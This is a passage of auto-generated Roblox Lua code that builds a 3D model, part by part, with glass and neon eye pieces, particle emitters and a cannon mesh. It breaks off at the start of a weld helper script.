eye_6.Name = "Eye"
eye_6.Parent = model

local eye_7 = Instance.new("Part")
eye_7.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_7.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(-0.9659236669540405, -0.0000012889466916021775, 0.25881853699684143))
eye_7.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_7.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_7.Material = Enum.Material.Neon
eye_7.Orientation = Vector3.new(0, -75, 0)
eye_7.Rotation = Vector3.new(0, -75, 0.0010000000474974513)
eye_7.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_7.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_7.Name = "Eye"
eye_7.Parent = model

local eye_8 = Instance.new("Part")
eye_8.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_8.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.8660235404968262, 0.000006512624622700969, 0.499999463558197), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(-0.49999892711639404, 0.0000046897771426301915, 0.8660239577293396))
eye_8.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_8.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_8.Material = Enum.Material.Neon
eye_8.Orientation = Vector3.new(0, -30, 0)
eye_8.Rotation = Vector3.new(0, -30, 0)
eye_8.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_8.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_8.Name = "Eye"
eye_8.Parent = model

local eye_9 = Instance.new("Part")
eye_9.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_9.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.9659236073493958, 0.0000012889454410469625, -0.25881871581077576), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.25881877541542053, 0.000007921294127299916, 0.9659242630004883))
eye_9.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_9.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_9.Material = Enum.Material.Neon
eye_9.Orientation = Vector3.new(0, 15, 0)
eye_9.Rotation = Vector3.new(0, 15, 0)
eye_9.Size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_9.size = Vector3.new(0.05000000074505806, 0.3499999940395355, 0.4099999964237213)
eye_9.Name = "Eye"
eye_9.Parent = model

local eye_10 = Instance.new("Part")
eye_10.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
eye_10.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941935062408447, 22.24728775024414, 17.61255645751953), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
eye_10.Color = Color3.new(0.517647, 0.517647, 0.517647)
eye_10.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
eye_10.Material = Enum.Material.Neon
eye_10.Orientation = Vector3.new(0, 15, 0)
eye_10.Rotation = Vector3.new(0, 15, 0)
eye_10.Size = Vector3.new(0.3799999952316284, 0.4099999964237213, 0.3799999952316284)
eye_10.size = Vector3.new(0.3799999952316284, 0.4099999964237213, 0.3799999952316284)
eye_10.Name = "Eye"
eye_10.Parent = model

local mesh_52 = Instance.new("CylinderMesh")
mesh_52.Parent = eye_10

local part_6 = Instance.new("Part")
part_6.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_6.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941930294036865, 22.04728889465332, 17.612558364868164), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_6.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_6.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_6.Material = Enum.Material.Glass
part_6.Orientation = Vector3.new(0, 15, 0)
part_6.Rotation = Vector3.new(0, 15, 0)
part_6.Size = Vector3.new(0.3700000047683716, 0.5, 0.3700000047683716)
part_6.size = Vector3.new(0.3700000047683716, 0.5, 0.3700000047683716)
part_6.Parent = model

local mesh_53 = Instance.new("SpecialMesh")
mesh_53.MeshType = Enum.MeshType.Sphere
mesh_53.Parent = part_6

local part_7 = Instance.new("Part")
part_7.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_7.CFrame = CFrame.fromMatrix(Vector3.new(-2.7683117389678955, 22.247289657592773, 17.709148406982422), Vector3.new(0.9659236669540405, 0.000001201523446070496, -0.2588186264038086), Vector3.new(0.0000030490416520478902, -0.9999988079071045, 0.000005375688488129526), Vector3.new(-0.25881868600845337, -0.000007921294127299916, -0.9659243226051331))
part_7.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_7.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_7.Material = Enum.Material.Glass
part_7.Orientation = Vector3.new(0, -165, 180)
part_7.Rotation = Vector3.new(180, -15, 0)
part_7.Size = Vector3.new(0.20000000298023224, 0.699999988079071, 0.4000000059604645)
part_7.size = Vector3.new(0.20000000298023224, 0.699999988079071, 0.4000000059604645)
part_7.Parent = model

local mesh_54 = Instance.new("SpecialMesh")
mesh_54.MeshType = Enum.MeshType.Wedge
mesh_54.Parent = part_7

local part_8 = Instance.new("Part")
part_8.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_8.CFrame = CFrame.fromMatrix(Vector3.new(-2.794194221496582, 22.447288513183594, 17.61255645751953), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.2588185966014862, -0.000007965005352161825, -0.9659243226051331), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
part_8.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_8.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_8.Material = Enum.Material.Glass
part_8.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, 170.80799865722656)
part_8.Rotation = Vector3.new(-90, 0, 15)
part_8.Size = Vector3.new(0.30000001192092896, 0.4000000059604645, 0.20000000298023224)
part_8.size = Vector3.new(0.30000001192092896, 0.4000000059604645, 0.20000000298023224)
part_8.Parent = model

local part_9 = Instance.new("Part")
part_9.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_9.CFrame = CFrame.fromMatrix(Vector3.new(-2.794194221496582, 22.447288513183594, 17.61255645751953), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_9.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_9.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_9.Material = Enum.Material.Glass
part_9.Orientation = Vector3.new(0, 15, 0)
part_9.Rotation = Vector3.new(0, 15, 0)
part_9.Size = Vector3.new(0.3499999940395355, 0.3499999940395355, 0.3499999940395355)
part_9.size = Vector3.new(0.3499999940395355, 0.3499999940395355, 0.3499999940395355)
part_9.Parent = model

local mesh_55 = Instance.new("CylinderMesh")
mesh_55.Parent = part_9

local part_10 = Instance.new("Part")
part_10.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_10.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941951751708984, 22.74728775024414, 17.6125545501709), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_10.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_10.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_10.Material = Enum.Material.Glass
part_10.Orientation = Vector3.new(0, 15, 0)
part_10.Rotation = Vector3.new(0, 15, 0)
part_10.Size = Vector3.new(0.5, 0.10000000149011612, 0.5)
part_10.size = Vector3.new(0.5, 0.10000000149011612, 0.5)
part_10.Parent = model

local mesh_56 = Instance.new("CylinderMesh")
mesh_56.Parent = part_10

local part_11 = Instance.new("Part")
part_11.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_11.CFrame = CFrame.fromMatrix(Vector3.new(-2.7941954135894775, 22.847288131713867, 17.612552642822266), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_11.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_11.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_11.Material = Enum.Material.Glass
part_11.Orientation = Vector3.new(0, 15, 0)
part_11.Rotation = Vector3.new(0, 15, 0)
part_11.Size = Vector3.new(0.5, 0.10000000149011612, 0.44999998807907104)
part_11.size = Vector3.new(0.5, 0.10000000149011612, 0.44999998807907104)
part_11.Parent = model

local mesh_57 = Instance.new("CylinderMesh")
mesh_57.Parent = part_11

local part_12 = Instance.new("Part")
part_12.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_12.CFrame = CFrame.fromMatrix(Vector3.new(-2.7522292137145996, 21.735158920288086, 17.769166946411133), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.18301460146903992, -0.7071003317832947, 0.6830154657363892), Vector3.new(-0.18301016092300415, -0.7071115374565125, -0.6830078363418579))
part_12.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_12.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_12.Material = Enum.Material.Glass
part_12.Orientation = Vector3.new(45, -165, 180)
part_12.Rotation = Vector3.new(134.0070037841797, -10.545000076293945, -10.729000091552734)
part_12.Size = Vector3.new(0.20000000298023224, 0.5, 0.20000000298023224)
part_12.size = Vector3.new(0.20000000298023224, 0.5, 0.20000000298023224)
part_12.Parent = model

local mesh_58 = Instance.new("SpecialMesh")
mesh_58.MeshType = Enum.MeshType.Wedge
mesh_58.Parent = part_12

local part_13 = Instance.new("Part")
part_13.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_13.CFrame = CFrame.fromMatrix(Vector3.new(-2.9236018657684326, 21.947284698486328, 17.129596710205078), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_13.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_13.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_13.Material = Enum.Material.Glass
part_13.Orientation = Vector3.new(0, 15, 0)
part_13.Rotation = Vector3.new(0, 15, 0)
part_13.Size = Vector3.new(0.10000000149011612, 0.20000000298023224, 0.05000000074505806)
part_13.size = Vector3.new(0.10000000149011612, 0.20000000298023224, 0.05000000074505806)
part_13.Parent = model

local part_14 = Instance.new("Part")
part_14.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_14.CFrame = CFrame.fromMatrix(Vector3.new(-2.922701597213745, 21.997041702270508, 17.132957458496094), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.036017484962940216, 0.9902679324150085, 0.13442538678646088), Vector3.new(0.2563002407550812, -0.13916510343551636, 0.9565247297286987))
part_14.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_14.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_14.Material = Enum.Material.Glass
part_14.Orientation = Vector3.new(8, 15, 0)
part_14.Rotation = Vector3.new(8.277999877929688, 14.85099983215332, -2.134999990463257)
part_14.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_14.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_14.Parent = model

local part_15 = Instance.new("Part")
part_15.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_15.CFrame = CFrame.fromMatrix(Vector3.new(-2.920017719268799, 22.04582977294922, 17.142974853515625), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.07133706659078598, 0.9612626433372498, 0.2662397027015686), Vector3.new(0.24879327416419983, -0.2756294012069702, 0.9285074472427368))
part_15.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_15.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_15.Material = Enum.Material.Glass
part_15.Orientation = Vector3.new(16, 15, 0)
part_15.Rotation = Vector3.new(16.534000396728516, 14.406000137329102, -4.223999977111816)
part_15.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_15.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_15.Parent = model

local part_16 = Instance.new("Part")
part_16.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_16.CFrame = CFrame.fromMatrix(Vector3.new(-2.915602684020996, 22.092700958251953, 17.159452438354492), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.10526815056800842, 0.9135475158691406, 0.3928719162940979), Vector3.new(0.23644383251667023, -0.4067288935184479, 0.8824178576469421))
part_16.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_16.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_16.Material = Enum.Material.Glass
part_16.Orientation = Vector3.new(24, 15, 0)
part_16.Rotation = Vector3.new(24.746000289916992, 13.677000045776367, -6.21999979019165)
part_16.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_16.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_16.Parent = model

local part_17 = Instance.new("Part")
part_17.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_17.CFrame = CFrame.fromMatrix(Vector3.new(-2.9095423221588135, 22.136741638183594, 17.182069778442383), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.13715031743049622, 0.8480512499809265, 0.5118573307991028), Vector3.new(0.21949228644371033, -0.5299118757247925, 0.8191530108451843))
part_17.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_17.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_17.Material = Enum.Material.Glass
part_17.Orientation = Vector3.new(32, 15, 0)
part_17.Rotation = Vector3.new(32.89899826049805, 12.678999900817871, -8.081000328063965)
part_17.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_17.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_17.Parent = model

local part_18 = Instance.new("Part")
part_18.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_18.CFrame = CFrame.fromMatrix(Vector3.new(-2.901954412460327, 22.177093505859375, 17.21038818359375), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.16636300086975098, 0.7660485506057739, 0.6208800077438354), Vector3.new(0.1982685625553131, -0.6427807807922363, 0.7399442791938782))
part_18.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_18.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_18.Material = Enum.Material.Glass
part_18.Orientation = Vector3.new(39.999000549316406, 15, 0)
part_18.Rotation = Vector3.new(40.97999954223633, 11.435999870300293, -9.772000312805176)
part_18.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_18.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_18.Parent = model

local part_19 = Instance.new("Part")
part_19.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_19.CFrame = CFrame.fromMatrix(Vector3.new(-2.892987012863159, 22.21297264099121, 17.24385643005371), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.19233761727809906, 0.669135570526123, 0.717818021774292), Vector3.new(0.17318576574325562, -0.7431386113166809, 0.6463333964347839))
part_19.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_19.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_19.Material = Enum.Material.Glass
part_19.Orientation = Vector3.new(47.999000549316406, 15, 0)
part_19.Rotation = Vector3.new(48.98500061035156, 9.972999572753906, -11.26200008392334)
part_19.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_19.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_19.Parent = model

local part_20 = Instance.new("Part")
part_20.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_20.CFrame = CFrame.fromMatrix(Vector3.new(-2.882814407348633, 22.243680953979492, 17.281822204589844), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.2145686000585556, 0.5591986775398254, 0.8007844686508179), Vector3.new(0.14473210275173187, -0.8290321230888367, 0.5401423573493958))
part_20.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_20.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_20.Material = Enum.Material.Glass
part_20.Orientation = Vector3.new(55.999000549316406, 15, 0)
part_20.Rotation = Vector3.new(56.91400146484375, 8.321999549865723, -12.52400016784668)
part_20.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_20.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_20.Parent = model

local part_21 = Instance.new("Part")
part_21.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_21.CFrame = CFrame.fromMatrix(Vector3.new(-2.8716347217559814, 22.268619537353516, 17.323545455932617), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.23262324929237366, 0.43837761878967285, 0.8681645393371582), Vector3.new(0.11346139013767242, -0.8987894654273987, 0.42343804240226746))
part_21.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_21.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_21.Material = Enum.Material.Glass
part_21.Orientation = Vector3.new(63.999000549316406, 15, 0)
part_21.Rotation = Vector3.new(64.77400207519531, 6.514999866485596, -13.541000366210938)
part_21.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_21.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_21.Parent = model

local part_22 = Instance.new("Part")
part_22.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_22.CFrame = CFrame.fromMatrix(Vector3.new(-2.8596653938293457, 22.287303924560547, 17.368215560913086), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(0.2461501508951187, 0.30902403593063354, 0.9186467528343201), Vector3.new(0.07998229563236237, -0.9510528445243835, 0.2984920144081116))
part_22.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_22.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_22.Material = Enum.Material.Glass
part_22.Orientation = Vector3.new(71.9990005493164, 15, 0)
part_22.Rotation = Vector3.new(72.57499694824219, 4.5879998207092285, -14.29699993133545)
part_22.Size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_22.size = Vector3.new(0.10000000149011612, 0.05000000074505806, 0.05000000074505806)
part_22.Parent = model

local part_23 = Instance.new("Part")
part_23.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_23.CFrame = CFrame.fromMatrix(Vector3.new(-2.794201374053955, 24.747285842895508, 17.6125431060791), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
part_23.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_23.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_23.Material = Enum.Material.Glass
part_23.Orientation = Vector3.new(0, 15, 0)
part_23.Rotation = Vector3.new(0, 15, 0)
part_23.Size = Vector3.new(0.25, 5, 0.25)
part_23.size = Vector3.new(0.25, 5, 0.25)
part_23.Parent = model

local mesh_59 = Instance.new("CylinderMesh")
mesh_59.Parent = part_23

local hole = Instance.new("Part")
hole.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
hole.CFrame = CFrame.fromMatrix(Vector3.new(-2.7942090034484863, 27.197282791137695, 17.612529754638672), Vector3.new(0.9659236669540405, 0.0000012889468052890152, -0.25881853699684143), Vector3.new(-0.000003133485279249726, 0.9999988079071045, -0.000005353061624191469), Vector3.new(0.2588185966014862, 0.000007921294127299916, 0.9659243226051331))
hole.Color = Color3.new(0.517647, 0.517647, 0.517647)
hole.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
hole.Material = Enum.Material.Neon
hole.Orientation = Vector3.new(0, 15, 0)
hole.Rotation = Vector3.new(0, 15, 0)
hole.Size = Vector3.new(0.23999999463558197, 0.05000000074505806, 0.23999999463558197)
hole.size = Vector3.new(0.23999999463558197, 0.05000000074505806, 0.23999999463558197)
hole.Name = "Hole"
hole.Parent = model

local mesh_60 = Instance.new("CylinderMesh")
mesh_60.Parent = hole

local particle_emitter = Instance.new("ParticleEmitter")
particle_emitter.Acceleration = Vector3.new(0, 5, 0)
particle_emitter.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0.0156863)), ColorSequenceKeypoint.new(1, Color3.new(1, 0, 0.0156863))})
particle_emitter.Lifetime = NumberRange.new(0.5, 1)
particle_emitter.LightEmission = 0.5
particle_emitter.Rate = 500
particle_emitter.RotSpeed = NumberRange.new(-180, 180)
particle_emitter.Rotation = NumberRange.new(-180, 180)
particle_emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.10000000149011612), NumberSequenceKeypoint.new(1, 0)})
particle_emitter.Speed = NumberRange.new(0.20000000298023224, 0.20000000298023224)
particle_emitter.SpreadAngle = Vector2.new(360, 360)
particle_emitter.Texture = "http://www.roblox.com/asset/?id=304437537"
particle_emitter.ZOffset = 0.20000000298023224
particle_emitter.Parent = hole

local part_24 = Instance.new("Part")
part_24.BrickColor = BrickColor.new(0.5372549295425415, 0.529411792755127, 0.5333333611488342)
part_24.CFrame = CFrame.fromMatrix(Vector3.new(-2.794194221496582, 22.447288513183594, 17.61255645751953), Vector3.new(-0.17364415526390076, -0.000007822358384146355, -0.984808087348938), Vector3.new(-0.9848074316978455, -0.0000019782719391514547, 0.1736440360546112), Vector3.new(-0.0000031447987112187548, 0.9999988079071045, -0.000005395283551479224))
part_24.Color = Color3.new(0.517647, 0.517647, 0.517647)
part_24.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
part_24.Material = Enum.Material.Glass
part_24.Orientation = Vector3.new(-89.91200256347656, -149.76300048828125, -104.19300079345703)
part_24.Rotation = Vector3.new(-90, 0, 100)
part_24.Size = Vector3.new(0.05000000074505806, 0.05000000074505806, 0.05000000074505806)
part_24.size = Vector3.new(0.05000000074505806, 0.05000000074505806, 0.05000000074505806)
part_24.Parent = model

local mesh_61 = Instance.new("SpecialMesh")
mesh_61.MeshType = Enum.MeshType.FileMesh
mesh_61.MeshId = "http://www.roblox.com/asset/?id=156292343"
mesh_61.Offset = Vector3.new(0, 0, 0.20000000298023224)
mesh_61.Scale = Vector3.new(0.800000011920929, 0.800000011920929, 1.5)
mesh_61.Parent = part_24

local cannon = Instance.new("Part")
cannon.BottomSurface = Enum.SurfaceType.Smooth
cannon.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
cannon.CFrame = CFrame.fromMatrix(Vector3.new(0.06177568435668945, 25.64833641052246, 16.208534240722656), Vector3.new(0.9659257531166077, 0.0000014603137969970703, -0.258819043636322), Vector3.new(-0.0000032186508178710938, 1, -0.000006332993507385254), Vector3.new(0.258819043636322, 0.00000695272956363624, 0.9659258127212524))
cannon.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
cannon.CustomPhysicalProperties = PhysicalProperties.new(0.009999999776482582, 0, 0, 0, 0)
cannon.Orientation = Vector3.new(0, 15, 0)
cannon.Rotation = Vector3.new(0, 15, 0)
cannon.Size = Vector3.new(4, 1, 2)
cannon.TopSurface = Enum.SurfaceType.Smooth
cannon.size = Vector3.new(4, 1, 2)
cannon.Name = "Cannon"
cannon.Parent = de3989fd03ud

local mesh_62 = Instance.new("SpecialMesh")
mesh_62.MeshType = Enum.MeshType.FileMesh
mesh_62.MeshId = "rbxassetid://1485890441"
mesh_62.Scale = Vector3.new(0.019999999552965164, 0.019999999552965164, 0.019999999552965164)
mesh_62.Parent = cannon

local part_25 = Instance.new("Part")
part_25.BackSurface = Enum.SurfaceType.Studs
part_25.BottomSurface = Enum.SurfaceType.Smooth
part_25.CFrame = CFrame.fromMatrix(Vector3.new(-1.2323203086853027, 25.87404441833496, 11.378904342651367), Vector3.new(0.258819043636322, 0.00000695272956363624, 0.9659258127212524), Vector3.new(-0.0000032186508178710938, 1, -0.000006332993507385254), Vector3.new(-0.9659257531166077, -0.0000014603137969970703, 0.258819043636322))
part_25.Orientation = Vector3.new(0, -75, 0)
part_25.Rotation = Vector3.new(0, -75, 0.0010000000474974513)
part_25.Size = Vector3.new(0.5, 0.5, 0.5)
part_25.TopSurface = Enum.SurfaceType.Smooth
part_25.size = Vector3.new(0.5, 0.5, 0.5)
part_25.Parent = cannon

local weld_constraint = Instance.new("WeldConstraint")
weld_constraint.Part0 = part_25
weld_constraint.Part1 = cannon
weld_constraint.Parent = part_25

local weld_38 = Instance.new("Weld")
weld_38.C0 = CFrame.fromMatrix(Vector3.new(0, -0.5, 0), Vector3.new(1, 0, 0), Vector3.new(0, 0, 1), Vector3.new(0, -1, 0))
weld_38.C1 = CFrame.fromMatrix(Vector3.new(-9.005377769470215, 10.000019073486328, 20.66554832458496), Vector3.new(1, 0, 0), Vector3.new(0, 0, 1), Vector3.new(0, -1, 0))
weld_38.Part0 = cannon
weld_38.Parent = cannon

local abox = Instance.new("Part")
abox.BottomSurface = Enum.SurfaceType.Smooth
abox.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
abox.CFrame = CFrame.fromMatrix(Vector3.new(-0.9777572154998779, 25.14908790588379, 16.00265884399414), Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
abox.Color = Color3.new(0, 0, 0)
abox.Size = Vector3.new(12.715087890625, 12.899999618530273, 11.446672439575195)
abox.TopSurface = Enum.SurfaceType.Smooth
abox.size = Vector3.new(12.715087890625, 12.899999618530273, 11.446672439575195)
abox.Name = "A box"
abox.Parent = de3989fd03ud

local head_particle = Instance.new("ParticleEmitter")
head_particle.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)), ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0))})
head_particle.Lifetime = NumberRange.new(1, 1)
head_particle.Rate = 100000002004087730000
head_particle.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.699999988079071), NumberSequenceKeypoint.new(1, 0.699999988079071)})
head_particle.Speed = NumberRange.new(0, 0)
head_particle.SpreadAngle = Vector2.new(720, 720)
head_particle.Texture = "rbxasset://textures/particles/smoke_main.dds"
head_particle.Name = "HeadParticle"
head_particle.Parent = de3989fd03ud

--//Modules

local modules = {}

--// Scripts

-- weld
task.spawn(function()
	local script = weld_2
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	-- Created by Quenty (@Quenty, follow me on twitter).
	-- Should work with only ONE copy, seamlessly with weapons, trains, et cetera.
